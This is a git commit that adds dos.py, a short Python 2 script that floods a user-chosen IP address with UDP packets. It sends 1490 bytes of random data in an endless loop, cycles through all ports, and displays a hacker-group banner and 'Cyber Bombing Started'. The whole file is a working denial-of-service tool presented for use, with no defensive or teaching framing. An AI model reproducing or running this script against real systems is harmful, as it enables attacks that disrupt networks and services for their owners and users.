c165cde2ead0354aea9a4bf2a6cea0eb169293b8
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2023-10-22 11:38:30 -0300

    dos.py

---
+++ dos.py
@@ -0,0 +1,36 @@
+import os
+import socket
+import random
+from datetime import datetime
+
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+os.system("clear")
+os.system("figlet WeAreDedSec")
+print  
+print "Author   : Wrench"
+print "Instagram : @jeanseven"
+print "github   : https://github.com/Jeanpseven"
+print  
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Cyber Bombing Started")
+
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
